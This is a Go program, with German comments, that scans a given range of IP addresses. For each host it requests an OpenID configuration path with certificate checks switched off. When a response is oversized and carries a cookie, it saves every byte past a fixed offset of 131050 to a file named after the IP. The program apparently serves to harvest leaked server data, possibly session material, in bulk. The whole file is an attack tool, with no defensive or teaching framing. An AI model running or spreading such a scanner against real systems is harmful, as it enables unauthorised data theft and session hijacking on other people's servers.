package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Verwendung: programmname start_ip end_ip")
		return
	}

	startIP := os.Args[1]
	endIP := os.Args[2]

	// Beispiel: startIP = "192.168.0.1", endIP = "192.168.0.5"
	ipRange := generateIPRange(startIP, endIP)

	var wg sync.WaitGroup

	for _, ip := range ipRange {
		wg.Add(1)
		time.Sleep(10 * time.Millisecond)
		go processIP(ip, &wg)
	}

	wg.Wait()
}

func generateIPRange(startIP, endIP string) []string {
	var ipRange []string

	// Konvertiere die Start- und End-IPs in Integers
	startOctets := strings.Split(startIP, ".")
	endOctets := strings.Split(endIP, ".")

	startInt := convertOctetsToInt(startOctets)
	endInt := convertOctetsToInt(endOctets)

	// Durchlaufe den IP-Bereich
	for i := startInt; i <= endInt; i++ {
		ip := convertIntToIP(i)
		ipRange = append(ipRange, ip)
	}

	return ipRange
}

func convertOctetsToInt(octets []string) int {
	result := 0
	for i := 0; i < 4; i++ {
		octetInt := atoi(octets[i])
		result = result<<8 + octetInt
	}
	return result
}

func convertIntToIP(ipInt int) string {
	octets := make([]string, 4)
	for i := 3; i >= 0; i-- {
		octet := ipInt & 255
		octets[i] = fmt.Sprint(octet)
		ipInt >>= 8
	}
	return strings.Join(octets, ".")
}

func atoi(s string) int {
	result, _ := strconv.Atoi(s)
	return result
}

func processIP(ip string, wg *sync.WaitGroup) {
	defer wg.Done()

	url := fmt.Sprintf("https://%s/oauth/idp/.well-known/openid-configuration", ip)

	// Konfiguriere den HTTP-Client, um die Überprüfung des Hostnamens zu deaktivieren
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: tr}

	// Führe die Anfrage an die IP durch
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("Fehler bei der Anfrage an %s: %v\n", ip, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// Lies den Body der Antwort ab
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("Fehler beim Lesen der Antwort von %s: %v\n", ip, err)
			return
		}

		// Überprüfe, ob der Body lang genug ist
		if len(body) >= 131050 {
			// Überprüfe, ob der "Set-Cookie"-Header vorhanden ist
			if cookie := resp.Header.Get("Set-Cookie"); cookie != "" {
				// Schreibe den Body in eine Datei mit dem Namen der IP
				filename := fmt.Sprintf("%s.txt", ip)
				err = ioutil.WriteFile(filename, body[131050:], 0644)
				if err != nil {
					fmt.Printf("Fehler beim Schreiben der Datei für %s: %v\n", ip, err)
					return
				}

				fmt.Printf("Ergebnisse für %s wurden in %s gespeichert.\n", ip, filename)
			} else {
				fmt.Printf("Antwort von %s enthält keinen 'Set-Cookie'-Header.\n", ip)
			}
		} else {
			fmt.Printf("Body für %s ist nicht lang genug.\n", ip)
		}
	} else {
		fmt.Printf("Anfrage an %s fehlgeschlagen. Statuscode: %d\n", ip, resp.StatusCode)
	}
}
